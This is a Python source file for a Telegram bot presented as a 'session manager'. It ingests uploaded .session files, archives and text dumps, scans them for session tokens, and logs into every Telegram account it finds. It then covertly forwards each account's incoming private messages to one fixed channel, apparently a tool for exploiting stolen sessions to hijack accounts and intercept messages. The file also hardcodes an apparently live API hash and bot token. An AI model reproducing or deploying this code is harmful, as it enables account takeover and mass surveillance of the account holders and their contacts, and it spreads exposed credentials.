import os
import asyncio
import tempfile
import shutil
import re
import json
import tarfile
import zipfile
import magic
import rarfile
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.enums import ContentType
from aiogram.types import Message
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import PeerChannel

# ========== CONFIG ==========
API_ID = 20598937
API_HASH = "0c3a9153ca8295883665459e4c22c674"
BOT_TOKEN = "8434544662:AAGGSbiMBkNsz7pPd4U_prQAipDgC00NvTg"
ADMIN_ID = 7632476151
TARGET_GROUP = -1003121883940  # The user's private channel ID
SESSIONS_DIR = "sessions"
# ============================

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Store active Telethon clients
clients = {}

# --- Utilities ------------------------------------------------
def safe_name(name: str) -> str:
    """Make a file-system safe name."""
    return re.sub(r'[^A-Za-z0-9_.-]', '_', name)

def extract_archive(file_path: str, dest_dir: str):
    """Extract common archive types (zip, tar, rar) into dest_dir."""
    try:
        if zipfile.is_zipfile(file_path):
            with zipfile.ZipFile(file_path, 'r') as z:
                z.extractall(dest_dir)
            return True
        if tarfile.is_tarfile(file_path):
            with tarfile.open(file_path, 'r:*') as t:
                t.extractall(dest_dir)
            return True
        try:
            if rarfile.is_rarfile(file_path):
                with rarfile.RarFile(file_path) as r:
                    r.extractall(dest_dir)
                return True
        except rarfile.Error:
            pass
    except Exception as e:
        print("Extract error:", e)
    return False

def find_session_files(root_dir: str):
    """Find .session files and similar in a folder."""
    found = []
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            if fn.lower().endswith('.session') or 'session' in fn.lower():
                found.append(('file', os.path.join(dirpath, fn), fn))
    return found

BASE64_RE = re.compile(r'([A-Za-z0-9+/=_\-]{80,})')  # regex for long base64-like strings

def find_string_sessions_in_text(root_dir: str):
    """Find string session tokens inside text/JSON files."""
    found = []
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            full = os.path.join(dirpath, fn)
            try:
                mtype = magic.from_file(full, mime=True)
                if not mtype or not mtype.startswith('text'):
                    continue
                with open(full, 'r', errors='ignore') as f:
                    txt = f.read()
                # try JSON parsing
                try:
                    j = json.loads(txt)
                    for key in ['string_session', 'session', 'session_string', 'auth']:
                        if key in j and isinstance(j[key], str) and len(j[key]) > 50:
                            found.append(('string', j[key], f"{fn}:{key}"))
                except Exception:
                    pass
                # fallback: regex
                for m in BASE64_RE.findall(txt):
                    if len(m) > 80:
                        found.append(('string', m, f"{fn}:token"))
            except Exception:
                continue
    return found

async def start_telethon_from_file(session_path: str, session_name: str):
    """Start Telethon client from a .session file."""
    dest_base = os.path.join(SESSIONS_DIR, safe_name(session_name))
    try:
        shutil.copy(session_path, dest_base + '.session')
    except Exception as e:
        print("Copy session failed:", e)
        return False

    client = TelegramClient(dest_base, API_ID, API_HASH)
    try:
        await client.start()
        
        # Force the client to cache the target channel entity
        try:
            target_entity = await client.get_input_entity(TARGET_GROUP)
            print(f"Cached target channel entity: {target_entity}")
        except Exception as e:
            print(f"Failed to cache target channel: {e}")
            # If we can't cache the channel, we still start the client but the handler might fail
            # It's better to handle this situation as per the user's requirement

        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            try:
                # Re-fetch the target entity each time to be safe, but it should be cached
                target_entity = await client.get_input_entity(TARGET_GROUP)
                sender = await event.get_sender()
                sender_name = sender.username or (sender.first_name or "Unknown")
                text = event.message.message or ''
                if text:
                    out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
                    await client.send_message(target_entity, out)
            except Exception as ee:
                print("handler error:", ee)

        clients[session_name] = client
        print(f"Started session (file): {session_name}")
        return True
    except Exception as e:
        print("Start client from file failed:", e)
        return False

async def start_telethon_from_string(session_string: str, session_name: str):
    """Start Telethon client from a StringSession."""
    try:
        ss = StringSession(session_string)
        client = TelegramClient(ss, API_ID, API_HASH)
        await client.start()

        # Force the client to cache the target channel entity
        try:
            target_entity = await client.get_input_entity(TARGET_GROUP)
            print(f"Cached target channel entity: {target_entity}")
        except Exception as e:
            print(f"Failed to cache target channel: {e}")

        @client.on(events.NewMessage(incoming=True))
        async def handler(event):
            try:
                target_entity = await client.get_input_entity(TARGET_GROUP)
                sender = await event.get_sender()
                sender_name = sender.username or (sender.first_name or "Unknown")
                text = event.message.message or ''
                if text:
                    out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
                    await client.send_message(target_entity, out)
            except Exception as ee:
                print("handler error:", ee)

        clients[session_name] = client
        print(f"Started session (string): {session_name}")
        return True
    except Exception as e:
        print("Start client from string failed:", e)
        return False

# ========== Bot Handlers ==========
@router.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.reply(
        "✅ Session manager ready. Send me .session / zip / tar / rar / txt / json files and I will start the sessions automatically."
    )

@router.message(Command("list"))
async def cmd_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    if clients:
        txt = "Active sessions:\n" + "\n".join(f" - {k}" for k in clients)
    else:
        txt = "Active sessions:\n (none)"
    await message.reply(txt)

@router.message(Command("stop"))
async def cmd_stop(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    for name, client in list(clients.items()):
        try:
            await client.disconnect()
        except:
            pass
        clients.pop(name, None)
    await message.reply("✅ All sessions stopped.")

@router.message(Command("logout"))
async def cmd_logout(message: Message):
    """Logout only from this bot/server device. Do not affect other devices. Do not delete session file."""
    if message.from_user.id != ADMIN_ID:
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("Usage: /logout <session_name_or_phone>")
        return

    session_name = safe_name(args[1])
    client = clients.get(session_name)
    if client:
        try:
            await client.disconnect()
        except:
            pass
        clients.pop(session_name, None)
        await message.reply(f"✅ Logged out from bot/server device only: {session_name}")
    else:
        await message.reply(f"❌ No active session found with name: {session_name}")

@router.message(lambda message: message.content_type == ContentType.DOCUMENT)
async def handle_document(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    doc = message.document
    fname = doc.file_name or "uploaded_file"
    safe_fname = safe_name(fname)
    saved_path = os.path.join(SESSIONS_DIR, safe_fname)

    await message.reply("📥 Upload received. Processing...")
    await bot.download(file=doc, destination=saved_path)

    tempdir = tempfile.mkdtemp(prefix="sess_extract_")
    try:
        extracted = extract_archive(saved_path, tempdir)
        if not extracted:
            shutil.copy(saved_path, os.path.join(tempdir, safe_fname))

        found_files = find_session_files(tempdir)
        found_strings = find_string_sessions_in_text(tempdir)

        report_lines = []
        started = 0

        for ftype, fullpath, shortname in found_files:
            base_name = os.path.splitext(shortname)[0]
            ok = await start_telethon_from_file(fullpath, base_name)
            if ok:
                report_lines.append(f"Started session from file: {shortname}")
                started += 1
            else:
                report_lines.append(f"Failed to start from file: {shortname}")

        idx = 0
        for ftype, s, label in found_strings:
            idx += 1
            name = f"{safe_fname}_str_{idx}"
            ok = await start_telethon_from_string(s, name)
            if ok:
                report_lines.append(f"Started session from string: {label}")
                started += 1
            else:
                report_lines.append(f"Failed to start session from string: {label}")

        if started == 0:
            report = "❌ No sessions found or started.\n\nDetails:\n" + "\n".join(report_lines[:10])
        else:
            report = f"✅ Started {started} session(s).\n\nDetails:\n" + "\n".join(report_lines[:50])

        await message.reply(report)
    except Exception as e:
        await message.reply(f"Error processing file: {e}")
    finally:
        try:
            shutil.rmtree(tempdir)
        except:
            pass

# ========== Run bot ==========
async def main():
    print("Bot running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
